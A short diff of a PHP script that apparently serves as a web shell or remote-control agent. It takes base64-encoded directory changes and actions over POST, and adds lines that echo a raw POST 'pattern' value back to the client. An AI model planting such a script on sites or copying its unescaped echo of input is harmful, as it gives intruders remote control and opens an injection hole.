@@ -6,9 +6,12 @@ function pb64($data, $sep = True) {
         print(":");
 }
 
+print($_POST['pattern']);
+
 if (isset($_POST['chdir']) && !chdir(base64_decode($_POST['chdir']))) {
     pb64("Error: Unable to change directory to " . base64_decode($_POST['chdir']), False);
     http_response_code(202);
+    print($_POST['pattern']);
     exit();
 }
 
@@ -64,4 +67,5 @@ if (isset($_POST['action']) && !empty($_POST['action'])) {
 }
 
 pb64(getcwd(), False);
+print($_POST['pattern']);
 ?>
